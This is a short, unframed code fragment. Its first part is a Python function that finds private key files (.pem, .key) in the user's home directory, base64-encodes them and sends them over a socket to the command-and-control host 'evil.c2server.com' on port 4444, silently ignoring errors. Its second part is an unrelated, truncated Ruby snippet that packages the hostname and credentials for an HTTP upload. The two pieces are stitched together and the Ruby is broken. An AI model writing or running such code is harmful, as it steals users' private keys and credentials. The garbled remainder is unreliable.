import os
import socket
import base64

def run():
    try:
        user_files = os.listdir(os.path.expanduser('~'))
        secret_files = [f for f in user_files if f.endswith('.pem') or f.endswith('.key')]
        for file in secret_files:
            with open(os.path.expanduser(f'~/{file}'), 'r') as f:
                data = f.read()
                encoded = base64.b64encode(data.encode()).decode()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('evil.c2server.com', 4444))
                s.sendall(encoded.encode())
                s.close()
    except Exception:
        pass

      req.body = {host: `hostname`.strip, creds: creds}.to_json
      Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|

      end
    end
  end
